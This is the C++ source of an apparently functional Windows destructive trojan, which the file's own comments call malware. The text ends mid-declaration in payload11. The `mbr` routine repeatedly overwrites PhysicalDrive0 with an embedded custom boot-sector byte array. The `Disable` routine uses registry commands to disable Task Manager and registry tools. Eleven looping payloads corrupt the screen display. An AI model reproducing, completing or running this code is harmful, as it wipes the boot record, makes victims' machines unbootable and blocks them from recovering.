#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#pragma comment(lib, "ntdll.lib")
#define M_PI   3.14159265358979323846264338327950288
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBSH (DWORD)0x89345c
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)
#define CUSRGB(r, g, b) (r | g << 8 | g << 16)
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
/*COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}*/

DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
const unsigned char MasterBootRecord[] = {
  0xe5, 0x40, 0x50, 0xb8, 0x10, 0x00, 0x50, 0x50, 0xb0, 0x01, 0x50, 0x50,
  0x40, 0xcd, 0x10, 0xb8, 0x00, 0xb8, 0x8e, 0xd8, 0x8e, 0xc0, 0xbe, 0xe5,
  0x7d, 0x89, 0xe5, 0x8a, 0x5e, 0x02, 0x00, 0x5e, 0x03, 0x74, 0xfe, 0x8b,
  0x46, 0x08, 0x25, 0x82, 0x41, 0x0d, 0x6d, 0x1a, 0x92, 0x31, 0xc0, 0x31,
  0xff, 0xb5, 0x08, 0xf3, 0xab, 0x50, 0xe8, 0x07, 0x01, 0x58, 0x83, 0xc0,
  0x34, 0x3c, 0x9c, 0x75, 0x03, 0x05, 0x64, 0x04, 0x3d, 0x00, 0x0f, 0x72,
  0xec, 0xd1, 0x66, 0x08, 0xb8, 0xf8, 0x01, 0xbb, 0xf8, 0x0b, 0x73, 0x01,
  0x93, 0x79, 0x03, 0x83, 0xc0, 0x68, 0x97, 0xc6, 0x05, 0xf0, 0x80, 0x7e,
  0x03, 0x1a, 0x72, 0x03, 0xc6, 0x07, 0x0c, 0xbf, 0x2c, 0x07, 0xb8, 0x6a,
  0x7c, 0x50, 0xbb, 0x05, 0x00, 0x4b, 0x4b, 0xb0, 0x06, 0x88, 0x81, 0x60,
  0xff, 0x88, 0x01, 0x88, 0x81, 0xa0, 0x00, 0x79, 0xf0, 0xff, 0x35, 0xc7,
  0x05, 0x01, 0x0e, 0x80, 0x46, 0x06, 0x02, 0x19, 0xc0, 0xe8, 0x64, 0x00,
  0xcd, 0x16, 0x8f, 0x05, 0x88, 0xe0, 0x2c, 0x4c, 0xb4, 0x02, 0x3c, 0xff,
  0x74, 0x0e, 0x3c, 0x01, 0x74, 0x0a, 0x3c, 0xfc, 0x74, 0x04, 0x3c, 0x04,
  0x75, 0x37, 0xb4, 0x28, 0xf6, 0xec, 0x93, 0x8a, 0x01, 0x3c, 0xf0, 0x74,
  0x2d, 0x3c, 0xce, 0x73, 0x04, 0x3c, 0xb1, 0x77, 0x24, 0x3c, 0x04, 0x72,
  0x20, 0x8d, 0x39, 0xb7, 0x06, 0x74, 0x26, 0x3c, 0xb1, 0x73, 0x16, 0x3c,
  0x18, 0x77, 0x4d, 0xc6, 0x05, 0xfa, 0x74, 0x15, 0x3c, 0x08, 0x74, 0x0d,
  0x72, 0x18, 0x3c, 0x0f, 0x74, 0x03, 0xf6, 0x5e, 0x02, 0xc3, 0xe9, 0x36,
  0xff, 0xfe, 0x46, 0x01, 0xc3, 0xfe, 0x46, 0x00, 0xc3, 0xff, 0xd6, 0xf7,
  0xd8, 0xbb, 0xff, 0xd6, 0x03, 0x46, 0x04, 0x78, 0xfe, 0x89, 0x46, 0x04,
  0xbb, 0x98, 0x0f, 0xe8, 0x03, 0x00, 0x8a, 0x46, 0x03, 0x31, 0xc9, 0x41,
  0x83, 0xe8, 0x0a, 0x73, 0xfa, 0x05, 0x3a, 0x0a, 0xe8, 0x04, 0x00, 0x91,
  0x48, 0x75, 0xee, 0x89, 0x07, 0x4b, 0x4b, 0xc3, 0x24, 0x1f, 0xd0, 0xe0,
  0x88, 0xc4, 0x92, 0x8a, 0x7e, 0x00, 0xff, 0xd6, 0x28, 0xc6, 0x72, 0x10,
  0x88, 0xd7, 0xff, 0xd6, 0x2a, 0x46, 0x01, 0x72, 0x03, 0xe8, 0xb7, 0xff,
  0xcd, 0x16, 0xeb, 0xe7, 0xc6, 0x05, 0xfa, 0xc3, 0x05, 0xfa, 0x01, 0x50,
  0x97, 0xd1, 0xea, 0xb8, 0xb1, 0x00, 0xb9, 0x1a, 0x00, 0x73, 0x04, 0x57,
  0xf3, 0xab, 0x5f, 0xd1, 0xea, 0x73, 0x09, 0xb1, 0x08, 0xaa, 0x81, 0xc7,
  0x9f, 0x00, 0xe2, 0xf9, 0xb7, 0x15, 0xff, 0xd6, 0x91, 0xb7, 0x04, 0xff,
  0xd6, 0x88, 0xc5, 0xd0, 0xe8, 0x40, 0xb4, 0xa0, 0xf6, 0xe4, 0x01, 0xc8,
  0x28, 0xec, 0x24, 0xfe, 0x04, 0x04, 0x5f, 0x29, 0xc7, 0xb0, 0xc9, 0xbb,
  0xcd, 0xbb, 0xe8, 0x11, 0x00, 0xb0, 0xba, 0xbb, 0xfa, 0xba, 0xe8, 0x09,
  0x00, 0xfe, 0xcd, 0x79, 0xf4, 0xb0, 0xc8, 0xbb, 0xcd, 0xbc, 0x51, 0x57,
  0xe8, 0x15, 0x00, 0x88, 0xd8, 0xe8, 0x10, 0x00, 0xfe, 0xc9, 0x79, 0xf7,
  0x88, 0xf8, 0xe8, 0x07, 0x00, 0x5f, 0x59, 0x81, 0xc7, 0xa0, 0x00, 0xc3,
  0x3c, 0xfa, 0x75, 0x1f, 0xff, 0xd6, 0x3c, 0x06, 0x73, 0x0d, 0x02, 0x46,
  0x03, 0x2c, 0x05, 0x3c, 0x17, 0x7d, 0xfa, 0x04, 0x44, 0xeb, 0x0c, 0x3c,
  0x0b, 0x93, 0x2e, 0x8a, 0x58, 0x0d, 0x93, 0x72, 0x02, 0xb0, 0xfa, 0x3c,
  0xcd, 0x74, 0x04, 0x3c, 0xba, 0x75, 0x07, 0x80, 0x3d, 0xb1, 0x75, 0x02,
  0xb0, 0xce, 0xaa, 0x47, 0xc3, 0xb0, 0xfb, 0xf6, 0x66, 0x08, 0x04, 0x53,
  0x89, 0x46, 0x08, 0x30, 0xe4, 0xf6, 0xf7, 0x88, 0xe0, 0x98, 0x40, 0xc3,
  0x05, 0x0f, 0x04, 0x18, 0x08, 0x4f, 0x55, 0xaa
};
DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 0;
}
DWORD WINAPI payload1() {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h && rand() % 999)
				v = rand() % 999;
			*((BYTE*)data + 4 * i + v) -= 5;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI payload2() {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int j = 4 * i;

				int fx = (int)(j + (j * sin(x / 1.0)) + j + (j * sin(y / 1.0)) + j + (j * sin((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 1.0))) / 1;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload3() {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = (x * i) ^ (y * i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 999.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload4() {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = (x * i) & (y * i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 999.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload5() {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
	int v3; // [rsp+8Ch] [rbp+Ch]
	int v4; // [rsp+90h] [rbp+10h]
	int v5; // [rsp+94h] [rbp+14h]
	int v6; // [rsp+98h] [rbp+18h]
	int v7; // [rsp+9Ch] [rbp+1Ch]
	int v8; // [rsp+A0h] [rbp+20h]
	int v9; // [rsp+A4h] [rbp+24h]
	HGDIOBJ h; // [rsp+A8h] [rbp+28h]
	int cy; // [rsp+B0h] [rbp+30h]
	int SystemMetrics; // [rsp+B4h] [rbp+34h]
	HDC hdcSrc; // [rsp+B8h] [rbp+38h]
	HDC hdc; // [rsp+C0h] [rbp+40h]
	int i; // [rsp+CCh] [rbp+4Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		StretchBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v9 = i % SystemMetrics;
			v8 = i / SystemMetrics;
			v7 = 1 * (i / SystemMetrics);
			v6 = i / SystemMetrics * (i / SystemMetrics);
			v5 = i % SystemMetrics * (i % SystemMetrics);
			v4 = v5 / 1 + v5;
			v3 = v6 / 1 + v6;
			*((DWORD*)ppvBits + i) += v4 + v3;
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload6() {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v3; // [rsp+90h] [rbp+10h]
	int v4; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		StretchBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0, 0, 0xCC0020u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v4 = i / SystemMetrics;
			v3 = SystemMetrics * i / 2;
			*((DWORD*)ppvBits + i) += v3 * (i / SystemMetrics);
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload7() {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v3; // [rsp+90h] [rbp+10h]
	int v4; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int v10; // [rsp+B8h] [rbp+38h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		StretchBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0, 0, 0xCC0020u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v4 = i % SystemMetrics;
			v3 = i / SystemMetrics;
			v10 = i / SystemMetrics;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) ^ (i / SystemMetrics + v10);
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload8() {
	int y1; // esi
	int x1; // ebx
	int v3; // edi
	int v4; // eax
	int v5; // esi
	int v6; // ebx
	int v7; // edi
	int v8; // eax
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v11; // [rsp+90h] [rbp+10h]
	int v12; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v12 = i % SystemMetrics;
			v11 = i / cy;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) ^ (i / cy + SystemMetrics);
		}
		y1 = rand() % 2 + 1;
		x1 = rand() % 2 + 1;
		v3 = rand() % 2 + 1;
		v4 = rand();
		BitBlt(hdc, v4 % 2 + 1, v3, SystemMetrics, cy, hdc, x1, y1, 0x8800C6u);
		v5 = rand() % 2 + 1;
		v6 = rand() % 2 + 1;
		v7 = rand() % 2 + 1;
		v8 = rand();
		BitBlt(hdc, v8 % 2 + 1, v7, SystemMetrics, cy, hdc, v6, v5, 0xEE0086u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload9() {
	int y1; // esi
	int x1; // ebx
	int v3; // edi
	int v4; // eax
	int v5; // esi
	int v6; // ebx
	int v7; // edi
	int v8; // eax
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v11; // [rsp+90h] [rbp+10h]
	int v12; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v12 = i % SystemMetrics;
			v11 = i / cy;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) ^ (i / cy + SystemMetrics);
		}
		BitBlt(hdc, 1 - SystemMetrics, 0, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
		BitBlt(hdc, 0, 1 - cy, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
		BitBlt(hdc, 1, 1, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload10() {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v3; // [rsp+90h] [rbp+10h]
	int v4; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int v10; // [rsp+B8h] [rbp+38h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		StretchBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0, 0, 0xCC0020u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v4 = i % SystemMetrics;
			v3 = i / SystemMetrics;
			v10 = i / SystemMetrics;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) & (i / SystemMetrics + v10);
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload11() {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v3; // [rsp+90h] [rbp+10h]
	int v4; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int v10; // [rsp+B8h] [rbp+38h]
